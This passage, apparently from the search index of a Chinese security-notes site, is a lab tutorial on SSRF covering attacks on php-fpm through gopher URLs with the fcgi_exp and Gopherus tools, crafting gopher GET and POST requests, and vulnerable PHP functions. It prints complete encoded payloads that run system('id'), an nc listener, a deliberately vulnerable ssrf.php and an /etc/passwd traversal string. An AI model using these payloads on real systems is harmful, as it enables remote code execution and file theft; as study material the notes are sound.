Web\u8bbf\u95ee\u6d41\u7a0b\u3002\u8fd9\u91cc\u8bf4\u7684\u662f\u4f7f\u7528CGI\uff0c\u800cFastCGI\u5c31\u76f8\u5f53\u4e8e\u9ad8\u6027\u80fd\u7684CGI\uff0c\u4e0eCGI\u4e0d\u540c\u7684\u662f\u5b83\u50cf\u4e00\u4e2a\u5e38\u9a7b\u7684CGI\uff0c\u5728\u542f\u52a8\u540e\u4f1a\u4e00\u76f4\u8fd0\u884c\u7740\uff0c\u4e0d\u9700\u8981\u6bcf\u6b21\u5904\u7406\u6570\u636e\u65f6\u90fd\u542f\u52a8\u4e00\u6b21\uff0c\u6240\u4ee5FastCGI\u7684\u4e3b\u8981\u884c\u4e3a\u662f\u5c06CGI\u89e3\u91ca\u5668\u8fdb\u7a0b\u4fdd\u6301\u5728\u5185\u5b58\u4e2d\uff0c\u5e76\u56e0\u6b64\u83b7\u5f97\u8f83\u9ad8\u7684\u6027\u80fd \u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/FastCGI/#php-fpm","title":"php-fpm","text":"<p>FPM\uff08FastCGI \u8fdb\u7a0b\u7ba1\u7406\u5668\uff09\u53ef\u4ee5\u8bf4\u662fFastCGI\u7684\u4e00\u4e2a\u5177\u4f53\u5b9e\u73b0\uff0c\u7528\u4e8e\u66ff\u6362 PHP FastCGI \u7684\u5927\u90e8\u5206\u9644\u52a0\u529f\u80fd\uff0c\u5bf9\u4e8e\u9ad8\u8d1f\u8f7d\u7f51\u7ad9\u662f\u975e\u5e38\u6709\u7528\u7684\u3002</p> <p>\u653b\u51fbFastCGI\u7684\u4e3b\u8981\u539f\u7406\u5c31\u662f\uff0c\u5728\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u5b9e\u9645\u8bf7\u6c42\u4e2d\u4f1a\u51fa\u73b0\u4e00\u4e2a<code>SCRIPT_FILENAME': '/var/www/html/index.php</code>\u8fd9\u6837\u7684\u952e\u503c\u5bf9\uff0c\u5b83\u7684\u610f\u601d\u662fphp-fpm\u4f1a\u6267\u884c\u8fd9\u4e2a\u6587\u4ef6\uff0c\u4f46\u662f\u8fd9\u6837\u5373\u4f7f\u80fd\u591f\u63a7\u5236\u8fd9\u4e2a\u952e\u503c\u5bf9\u7684\u503c\uff0c\u4f46\u4e5f\u53ea\u80fd\u63a7\u5236php-fpm\u53bb\u6267\u884c\u67d0\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u6587\u4ef6\uff0c\u4e0d\u80fd\u591f\u5b9e\u73b0\u4e00\u4e9b\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u3002</p> <p>\u800c\u5728PHP 5.3.9\u540e\u6765\u7684\u7248\u672c\u4e2d\uff0cPHP\u589e\u52a0\u4e86\u5b89\u5168\u9009\u9879\u5bfc\u81f4\u53ea\u80fd\u63a7\u5236php-fpm\u6267\u884c\u4e00\u4e9bphp\u3001php4\u8fd9\u6837\u7684\u6587\u4ef6\uff0c\u8fd9\u4e5f\u589e\u5927\u4e86\u653b\u51fb\u7684\u96be\u5ea6\u3002\u4f46\u662f\u597d\u5728PHP\u5141\u8bb8\u901a\u8fc7PHP_ADMIN_VALUE\u548cPHP_VALUE\u53bb\u52a8\u6001\u4fee\u6539PHP\u7684\u8bbe\u7f6e\u3002</p> <p>\u90a3\u4e48\u5f53\u8bbe\u7f6ePHP\u73af\u5883\u53d8\u91cf\u4e3a\uff1a<code>auto_prepend_file = php://input;allow_url_include = On</code>\u65f6\uff0c\u5c31\u4f1a\u5728\u6267\u884cPHP\u811a\u672c\u4e4b\u524d\u5305\u542b\u73af\u5883\u53d8\u91cf<code>auto_prepend_file</code>\u6240\u6307\u5411\u7684\u6587\u4ef6\u5185\u5bb9\uff0c<code>php://input</code>\u4e5f\u5c31\u662f\u63a5\u6536POST\u7684\u5185\u5bb9\uff0c\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5728FastCGI\u534f\u8bae\u7684body\u63a7\u5236\u4e3a\u6076\u610f\u4ee3\u7801\uff0c\u8fd9\u6837\u5c31\u5728\u7406\u8bba\u4e0a\u5b9e\u73b0\u4e86php-fpm\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u653b\u51fb\u3002</p> <p>\u8be6\u60c5\u8bf7\u89c1\uff1a\u300aSSRF\u7cfb\u5217\u4e4b\u653b\u51fbFastCGI\u300b</p> <p>\u6d4b\u8bd5\u73af\u5883\uff1a</p> <p></p> <p>WEB\u670d\u52a1\u5668Ubuntu\uff08192.168.43.166\uff09\u5b58\u5728SSRF\u6f0f\u6d1e\uff1a</p> <p></p> <p>\u5e76\u4e14WEB\u670d\u52a1\u5668Ubuntu\u4e0a\u5b58\u5728FastCGI\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u5176SSRF\u6f0f\u6d1e\u53bb\u653b\u51fb\u5176\u672c\u5730\u7684FastCGI\u3002</p> <p>\u5047\u8bbe\u5728\u914d\u7f6efpm\u65f6\uff0c\u5c06\u76d1\u542c\u7684\u5730\u5740\u8bbe\u4e3a\u4e860.0.0.0:9000\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751fphp-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6b64\u65f6\u653b\u51fb\u8005\u53ef\u4ee5\u65e0\u9700\u5229\u7528SSRF\u4ece\u670d\u52a1\u5668\u672c\u5730\u8bbf\u95ee\u7684\u7279\u6027\uff0c\u76f4\u63a5\u4e0e\u670d\u52a1\u56689000\u7aef\u53e3\u4e0a\u7684php-fpm\u8fdb\u884c\u901a\u4fe1\uff0c\u8fdb\u800c\u53ef\u4ee5\u7528fcgi_exp\u7b49\u5de5\u5177\u53bb\u653b\u51fb\u670d\u52a1\u5668\u4e0a\u7684php-fpm\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\u5f53\u5185\u7f51\u4e2d\u7684\u5176\u4ed6\u4e3b\u673a\u4e0a\u914d\u7f6e\u6709fpm\uff0c\u4e14\u76d1\u542c\u7684\u5730\u5740\u4e3a0.0.0.0:9000\u65f6\uff0c\u90a3\u4e48\u8fd9\u53f0\u4e3b\u673a\u5c31\u53ef\u80fd\u5b58\u5728php-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528Ubuntu\u670d\u52a1\u5668\u4e0a\u7684SSRF\u53bb\u653b\u51fb\u4ed6\uff0c\u5982\u679c\u5185\u7f51\u4e2d\u7684\u8fd9\u53f0\u4e3b\u673a\u4e0d\u5b58\u5728php-fpm\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u5229\u7528Ubuntu\u670d\u52a1\u5668\u4e0a\u7684SSRF\u53bb\u653b\u51fb\u4ed6\u663e\u7136\u662f\u4e0d\u884c\u7684\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/FastCGI/#fcgi_exp","title":"\u4f7f\u7528fcgi_exp\u5de5\u5177\u653b\u51fb","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/piaca/fcgi_exp</p> <p>\u8fd9\u4e2a\u5de5\u5177\u4e3b\u8981\u662f\u7528\u6765\u653b\u51fb\u672a\u6388\u6743\u8bbf\u95eephp-fpm\u7684\uff0c\u53ef\u7528\u6765\u6d4b\u8bd5\u662f\u5426\u53ef\u4ee5\u76f4\u63a5\u653b\u51fbphp-fpm\uff0c\u4f46\u9700\u8981\u81ea\u5df1\u5c06\u751f\u6210\u7684payload\u8fdb\u884c\u8f6c\u6362\u4e00\u4e0b\u3002</p> <p>\u8be5\u5de5\u5177\u9700\u8981go\u8bed\u8a00\u73af\u5883\uff0c\u4e0b\u8f7d\u540e\u8fdb\u5165\u76ee\u5f55\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u7f16\u8bd1\uff1a</p> <pre><code>go build fcgi_exp.go \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0# \u7f16\u8bd1fcgi_exp.go\n</code></pre> <p>\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u5728\u653b\u51fb\u673a\u4e0a\u4f7f\u7528<code>nc -lvvp 2333 &gt; fcg_exp.txt</code>\u76d1\u542c2333 \u7aef\u53e3\u6765\u63a5\u6536fcgi_exp\u751f\u6210\u7684payload\uff0c\u53e6\u5916\u518d\u5f00\u542f\u4e00\u4e2a\u7ec8\u7aef\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u54112333\u7aef\u53e3\u53d1\u9001payload\uff1a</p> <pre><code>./fcgi_exp system 127.0.0.1 2333 /var/www/html/index.php \"id\"\n</code></pre> <p></p> <p>\u751f\u6210\u7684fcg_exp.txt\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u63a5\u6536\u5230\u7684payload\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a</p> <p></p> <p>\u7136\u540e\u5bf9fcg_exp.txt\u6587\u4ef6\u91cc\u7684payload\u8fdb\u884curl\u7f16\u7801\uff0c\u8fd9\u91cc\u901a\u8fc7\u5982\u4e0b\u811a\u672c\u5b9e\u73b0\uff08\u811a\u672c\u662f\u6211\u4ece\u7f51\u4e0a\u767d\u5ad6\u7684\u563f\u563f\uff09\uff1a</p> <pre><code># -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencode\u200bfile = open('fcg_exp.txt','r')payload = file.read()print(\"gopher://127.0.0.1:9000/_\"+quote(payload).replace(\"%0A\",\"%0D\").replace(\"%2F\",\"/\"))\n</code></pre> <p>\u6267\u884c\u4e0a\u9762\u7684python\u811a\u672c\u751f\u6210\u5982\u4e0bpayload\uff1a</p> <p></p> <p>\u8fd9\u91cc\u8fd8\u8981\u5bf9\u4e0a\u9762\u7684payload\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u7136\u540e\u5c06\u6700\u7ec8\u7684payload\u5185\u5bb9\u653e\u5230?url=\u540e\u9762\u53d1\u9001\u8fc7\u53bb\uff1a</p> <pre><code>ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2514%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509%255BPHP_VALUEallow_url_include%2520%253D%2520On%250Ddisable_functions%2520%253D%2520%250Dsafe_mode%2520%253D%2520Off%250Dauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2500%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----0vcdb34oju09b8fd-----%250D%2527%2529%253B%253F%253E\n</code></pre> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u547d\u4ee4\u6267\u884c\u6210\u529f\uff1a</p> <p></p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/FastCGI/#gopherus","title":"\u4f7f\u7528Gopherus\u5de5\u5177\u653b\u51fb","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/tarunkant/Gopherus</p> <p>\u8be5\u5de5\u5177\u53ef\u4ee5\u5e2e\u4f60\u751f\u6210\u7b26\u5408Gopher\u534f\u8bae\u683c\u5f0f\u7684payload\uff0c\u4ee5\u5229\u7528SSRF\u653b\u51fbRedis\u3001FastCGI\u3001MySql\u7b49\u5185\u7f51\u5e94\u7528\u3002</p> <p>\u4f7f\u7528Gopherus\u5de5\u5177\u751f\u6210\u653b\u51fbFastCGI\u7684payload\uff1a</p> <pre><code>python gopherus.py --exploit fastcgi/var/www/html/index.php \u00a0 \u00a0# \u8fd9\u91cc\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u5df2\u77e5\u5b58\u5728\u7684php\u6587\u4ef6id \u00a0 \u00a0# \u8f93\u5165\u4e00\u4e2a\u4f60\u8981\u6267\u884c\u7684\u547d\u4ee4\n</code></pre> <p></p> <p>\u7136\u540e\u8fd8\u662f\u5c06\u5f97\u5230\u7684payload\u8fdb\u884c\u4e8c\u6b21url\u7f16\u7801\uff0c\u5c06\u6700\u7ec8\u5f97\u5230\u7684payload\u653e\u5230?url=\u540e\u9762\u6253\u8fc7\u53bb\u8fc7\u53bb\uff1a</p> <pre><code>ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n</code></pre> <p></p> <p>\u547d\u4ee4\u6267\u884c\u6210\u529f\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/Gopher%E5%8D%8F%E8%AE%AE/","title":"Gopher\u534f\u8bae","text":"<p>\u8fd9\u4e2a\u5f88\u91cd\u8981</p> <p>Gopher\u534f\u8bae\u5728SSRF\u4e2d\u7684\u5229\u7528</p> <p>Gopher\u662fInternet\u4e0a\u4e00\u4e2a\u975e\u5e38\u6709\u540d\u7684\u4fe1\u606f\u67e5\u627e\u7cfb\u7edf\uff0c\u5b83\u5c06Internet\u4e0a\u7684\u6587\u4ef6\u7ec4\u7ec7\u6210\u67d0\u79cd\u7d22\u5f15\uff0c\u5f88\u65b9\u4fbf\u5730\u5c06\u7528\u6237\u4eceInternet\u7684\u4e00\u5904\u5e26\u5230\u53e6\u4e00\u5904\u3002\u5728WWW\u51fa\u73b0\u4e4b\u524d\uff0cGopher\u662fInternet\u4e0a\u6700\u4e3b\u8981\u7684\u4fe1\u606f\u68c0\u7d22\u5de5\u5177\uff0cGopher\u7ad9\u70b9\u4e5f\u662f\u6700\u4e3b\u8981\u7684\u7ad9\u70b9\uff0c\u4f7f\u7528TCP 70\u7aef\u53e3\u3002\u4f46\u5728WWW\u51fa\u73b0\u540e\uff0cGopher\u5931\u53bb\u4e86\u6614\u65e5\u7684\u8f89\u714c\u3002</p> <p>\u73b0\u5728\u7684Gopher\u534f\u8bae\u5df2\u7ecf\u5f88\u5c11\u6709\u4eba\u518d\u4f7f\u7528\u5b83\u4e86\uff0c\u4f46\u662f\u8be5\u534f\u8bae\u5728SSRF\u4e2d\u5374\u53ef\u4ee5\u53d1\u6325\u5de8\u5927\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u8bf4\u662fSSRF\u4e2d\u7684\u4e07\u91d1\u6cb9\u3002\u7531\u4e8eGopher\u534f\u8bae\u652f\u6301\u53d1\u51faGET\u3001POST\u8bf7\u6c42\uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u622a\u83b7GET\u8bf7\u6c42\u5305\u548cPOST\u8bf7\u6c42\u5305\uff0c\u518d\u6784\u9020\u6210\u7b26\u5408Gopher\u534f\u8bae\u8bf7\u6c42\u7684payload\u8fdb\u884cSSRF\u5229\u7528\uff0c\u751a\u81f3\u53ef\u4ee5\u7528\u5b83\u6765\u653b\u51fb\u5185\u7f51\u4e2d\u7684Redis\u3001MySql\u3001FastCGI\u7b49\u5e94\u7528\uff0c\u8fd9\u65e0\u7591\u5927\u5927\u6269\u5c55\u4e86\u6211\u4eec\u7684SSRF\u653b\u51fb\u9762\u3002</p> <p>\uff081\uff09Gopher\u534f\u8bae\u683c\u5f0f</p> <pre><code>URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_\u540e\u63a5TCP\u6570\u636e\u6d41\u200b# \u6ce8\u610f\u4e0d\u8981\u5fd8\u8bb0\u540e\u9762\u90a3\u4e2a\u4e0b\u5212\u7ebf\"_\"\uff0c\u4e0b\u5212\u7ebf\"_\"\u540e\u9762\u624d\u5f00\u59cb\u63a5TCP\u6570\u636e\u6d41\uff0c\u5982\u679c\u4e0d\u52a0\u8fd9\u4e2a\"_\"\uff0c\u90a3\u4e48\u670d\u52a1\u7aef\u6536\u5230\u7684\u6d88\u606f\u5c06\u4e0d\u662f\u5b8c\u6574\u7684\uff0c\u8be5\u5b57\u7b26\u53ef\u968f\u610f\u5199\u3002\n</code></pre> <p>gopher\u7684\u9ed8\u8ba4\u7aef\u53e3\u662f70</p> <ul> <li> <p>\u5982\u679c\u53d1\u8d77POST\u8bf7\u6c42\uff0c\u56de\u8f66\u6362\u884c\u9700\u8981\u4f7f\u7528<code>%0d%0a</code>\u6765\u4ee3\u66ff<code>%0a</code>\uff0c\u5982\u679c\u591a\u4e2a\u53c2\u6570\uff0c\u53c2\u6570\u4e4b\u95f4\u7684&amp;\u4e5f\u9700\u8981\u8fdb\u884cURL\u7f16\u7801</p> </li> <li> <p>\u90a3\u4e48\u5982\u4f55\u5229\u7528Gopher\u53d1\u9001HTTP\u7684\u8bf7\u6c42\u5462\uff1f\u4f8b\u5982GET\u8bf7\u6c42\u3002\u6211\u4eec\u76f4\u63a5\u53d1\u9001\u4e00\u4e2a\u539f\u59cb\u7684HTTP\u5305\u4e0d\u5c31\u884c\u4e86\u5417\u3002\u5728gopher\u534f\u8bae\u4e2d\u53d1\u9001HTTP\u7684\u6570\u636e\uff0c\u9700\u8981\u4ee5\u4e0b\u4e09\u6b65\uff1a</p> </li> </ul> <p>\uff082\uff09\u5229\u7528Gopher\u534f\u8bae\u53d1\u9001HTTP GET\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// echo.php&lt;?phpecho \"Hello \".$_GET[\"whoami\"].\"\\n\"?&gt;\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6784\u9020payload\u3002\u4e00\u4e2a\u5178\u578b\u7684GET\u578b\u7684HTTP\u5305\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72\n</code></pre> <p>\u7136\u540e\u5229\u7528\u4ee5\u4e0b\u811a\u672c\u8fdb\u884c\u4e00\u6b65\u751f\u6210\u7b26\u5408Gopher\u534f\u8bae\u683c\u5f0f\u7684payload\uff1a</p> <pre><code>import urllib.parsepayload =\\\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1Host: 47.xxx.xxx.72\"\"\" \u00a0# \u6ce8\u610f\u540e\u9762\u4e00\u5b9a\u8981\u6709\u56de\u8f66\uff0c\u56de\u8f66\u7ed3\u5c3e\u8868\u793ahttp\u8bf7\u6c42\u7ed3\u675ftmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://47.xxx.xxx.72:80/'+'_'+newprint(result)\n</code></pre> <p></p> <p>\u6ce8\u610f\u8fd9\u51e0\u4e2a\u95ee\u9898\uff1a</p> <p>\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>curl gopher://47.xxx.xxx.72:80/_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u6210\u529f\u7528GET\u65b9\u6cd5\u4f20\u53c2\u5e76\u8f93\u51fa\u201cHello Bunny\u201d\u3002</p> <p>\uff083\uff09\u5229\u7528Gopher\u534f\u8bae\u53d1\u9001HTTP POST\u8bf7\u6c42</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// echo.php&lt;?phpecho \"Hello \".$_POST[\"whoami\"].\"\\n\"?&gt;\n</code></pre> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u6784\u9020payload\u3002\u4e00\u4e2a\u5178\u578b\u7684POST\u578b\u7684HTTP\u5305\u7c7b\u4f3c\u5982\u4e0b\uff1a</p> <pre><code>POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12\nwhoami=Bunny\n</code></pre> <p>\u6ce8\u610f\uff1a\u4e0a\u9762\u90a3\u56db\u4e2aHTTP\u5934\u662fPOST\u8bf7\u6c42\u5fc5\u987b\u7684\uff0c\u5373POST\u3001Host\u3001Content-Type\u548cContent-Length\u3002\u5982\u679c\u5c11\u4e86\u4f1a\u62a5\u9519\u7684\uff0c\u800cGET\u5219\u4e0d\u7528\u3002\u5e76\u4e14\uff0c\u7279\u522b\u8981\u6ce8\u610fContent-Length\u5e94\u4e3a\u5b57\u7b26\u4e32\u201cwhoami=Bunny\u201d\u7684\u957f\u5ea6\u3002</p> <p>\u6700\u540e\u7528\u811a\u672c\u6211\u4eec\u5c06\u4e0a\u9762\u7684POST\u6570\u636e\u5305\u8fdb\u884cURL\u7f16\u7801\u5e76\u6539\u4e3agopher\u534f\u8bae</p> <pre><code>import urllib.parsepayload =\\\"\"\"POST /echo.php HTTP/1.1Host: 47.xxx.xxx.72Content-Type: application/x-www-form-urlencodedContent-Length: 12\nwhoami=Bunny\"\"\"  # \u6ce8\u610f\u540e\u9762\u4e00\u5b9a\u8981\u6709\u56de\u8f66\uff0c\u56de\u8f66\u7ed3\u5c3e\u8868\u793ahttp\u8bf7\u6c42\u7ed3\u675ftmp = urllib.parse.quote(payload)new = tmp.replace('%0A','%0D%0A')result = 'gopher://47.xxx.xxx.72:80/'+'_'+newprint(result)\n</code></pre> <p></p> <p>\u7136\u540e\u6267\u884c\uff1a</p> <pre><code>curl gopher://47.xxx.xxx.72:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u6210\u529f\u7528POST\u65b9\u6cd5\u4f20\u53c2\u5e76\u8f93\u51fa\u201cHello Bunny\u201d\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/","title":"SSRF","text":"<p>\u8fd9\u4e2a\u7f51\u4e0a\u8d44\u6599\u5c31\u591a\u5f88\u591a\u4e86\u6211\u9009\u62e9copy</p> <p>\u81ea\u5df1\u6765\u5199\u4e0d\u77e5\u9053\u54ea\u91cc\u5f00\u59cb\u5199\u8d77\u6765</p> <p>SSRF(Server-Side Request Forgery:\u670d\u52a1\u5668\u7aef\u8bf7\u6c42\u4f2a\u9020)\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF\u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u7f51\u3002\uff08\u6b63\u56e0\u4e3a\u5b83\u662f\u7531\u670d\u52a1\u7aef\u53d1\u8d77\u7684\uff0c\u6240\u4ee5\u5b83\u80fd\u591f\u8bf7\u6c42\u5230\u4e0e\u5b83\u76f8\u8fde\u800c\u4e0e\u5916\u7f51\u9694\u79bb\u7684\u5185\u7f51\uff09</p> <p>SSRF\u5f62\u6210\u7684\u539f\u56e0\u5927\u90fd\u662f\u7531\u4e8e\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u505a\u8fc7\u6ee4\u548c\u9650\u5236\u3002\u5373SSRF\u6f0f\u6d1e\u5c31\u662f\u901a\u8fc7\u7be1\u6539\u83b7\u53d6\u8d44\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u4f46\u662f\u670d\u52a1\u5668\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e2a\u8bf7\u6c42\u662f\u975e\u6cd5\u7684\uff0c\u7136\u540e\u670d\u52a1\u5668\u4ee5\u4ed6\u7684\u8eab\u4efd\u6765\u8bbf\u95ee\u5176\u4ed6\u670d\u52a1\u5668\u7684\u8d44\u6e90\u3002</p> <p></p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#_1","title":"\u6f0f\u6d1e\u51fd\u6570","text":"<p>SSRF\u6f0f\u6d1e\u76f8\u5173\u51fd\u6570\u548c\u7c7b</p> <p>file_get_contents()\uff1a\u5c06\u6574\u4e2a\u6587\u4ef6\u6216\u4e00\u4e2aurl\u6240\u6307\u5411\u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u3002</p> <ul> <li> <p>readfile()\uff1a\u8f93\u51fa\u4e00\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002</p> </li> <li> <p>fsockopen()\uff1a\u6253\u5f00\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u6216\u8005\u4e00\u4e2aUnix \u5957\u63a5\u5b57\u8fde\u63a5\u3002</p> </li> <li> <p>curl_exec()\uff1a\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8fd4\u56de\u4e00\u4e2acURL\u53e5\u67c4\uff0c\u4f9bcurl_setopt()\uff0ccurl_exec()\u548ccurl_close() \u51fd\u6570\u4f7f\u7528\u3002</p> </li> <li> <p>fopen()\uff1a\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u6587\u4ef6\u6216\u8005 URL\u3002</p> </li> <li> <p>\u4e0a\u8ff0\u51fd\u6570\u51fd\u6570\u4f7f\u7528\u4e0d\u5f53\u4f1a\u9020\u6210SSRF\u6f0f\u6d1e\u3002 \u6b64\u5916\uff0cPHP\u539f\u751f\u7c7bSoapClient\u5728\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u65f6\u53ef\u5bfc\u81f4SSRF\u3002(\u8bb0\u5f97\u5417\uff1f\u4e4b\u524d\u7684soapclient,ssrf+crlf)</p> </li> </ul>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#file_get_contents","title":"file_get_contents()","text":"<p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php$url = $_GET['url'];;echo file_get_contents($url);?&gt;\n</code></pre> <p>\u4e0a\u8ff0\u6d4b\u8bd5\u4ee3\u7801\u4e2d\uff0cfile_get_contents() \u51fd\u6570\u5c06\u6574\u4e2a\u6587\u4ef6\u6216\u4e00\u4e2aurl\u6240\u6307\u5411\u7684\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\uff0c\u6211\u4eec\u6784\u9020\u7c7b\u4f3c<code>ssrf.php?url=../../../../../etc/passwd</code>\u7684paylaod\u5373\u53ef\u8bfb\u53d6\u670d\u52a1\u5668\u672c\u5730\u7684\u4efb\u610f\u6587\u4ef6\u3002(\u8def\u5f84\u7a7f\u8d8a\uff0c\u5199\u5230\u540e\u9762\u662f\u6709\u4e1c\u897f\u4e32\u8d77\u6765\u7684)</p> <p></p> <p>readfile()\u51fd\u6570\u4e0efile_get_contents()\u51fd\u6570\u76f8\u4f3c\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#fsockopen","title":"fsockopen()","text":"<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>\u7528\u4e8e\u6253\u5f00\u4e00\u4e2a\u7f51\u7edc\u8fde\u63a5\u6216\u8005\u4e00\u4e2aUnix \u5957\u63a5\u5b57\u8fde\u63a5\uff0c\u521d\u59cb\u5316\u4e00\u4e2a\u5957\u63a5\u5b57\u8fde\u63a5\u5230\u6307\u5b9a\u4e3b\u673a\uff08hostname\uff09\uff0c\u5b9e\u73b0\u5bf9\u7528\u6237\u6307\u5b9aurl\u6570\u636e\u7684\u83b7\u53d6\u3002\u8be5\u51fd\u6570\u4f1a\u4f7f\u7528socket\u8ddf\u670d\u52a1\u5668\u5efa\u7acbtcp\u8fde\u63a5\uff0c\u8fdb\u884c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002 